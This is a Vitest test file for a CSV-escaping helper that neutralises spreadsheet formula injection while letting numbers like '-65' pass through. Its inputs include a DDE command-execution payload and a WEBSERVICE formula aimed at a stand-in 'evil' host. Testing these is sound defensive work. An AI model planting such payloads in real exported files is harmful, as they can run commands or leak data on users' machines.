import { describe, expect, it } from "vitest";
import { csvSafe } from "./csv";

describe("csvSafe", () => {
  it("passes pure numbers through untouched — a -65 ft correction round-trips", () => {
    expect(csvSafe("-65")).toBe("-65");
    expect(csvSafe("-1234.56")).toBe("-1234.56");
    expect(csvSafe("40.00")).toBe("40.00");
    expect(csvSafe("-1.5e3")).toBe("-1.5e3");
  });

  it("still guards non-numeric formula triggers", () => {
    expect(csvSafe("=cmd|'/C calc'!A0")).toBe("'=cmd|'/C calc'!A0");
    expect(csvSafe("+1+1")).toBe("'+1+1");
    expect(csvSafe("-2+3")).toBe("'-2+3"); // not a pure number — legacy formula trigger
    expect(csvSafe("@SUM(A1)")).toBe("'@SUM(A1)");
  });
  it("neutralizes Excel formula triggers", () => {
    expect(csvSafe('=WEBSERVICE("http://evil")')).toBe('\'=WEBSERVICE("http://evil")');
    expect(csvSafe("+cmd|/C calc")).toBe("'+cmd|/C calc");
    expect(csvSafe("-2+3")).toBe("'-2+3");
    expect(csvSafe("@SUM(A1)")).toBe("'@SUM(A1)");
  });
  it("leaves normal values untouched", () => {
    expect(csvSafe("15743")).toBe("15743");
    expect(csvSafe("4+47")).toBe("4+47"); // '+' not at position 0
    expect(csvSafe("bore")).toBe("bore");
    expect(csvSafe("")).toBe("");
  });
});
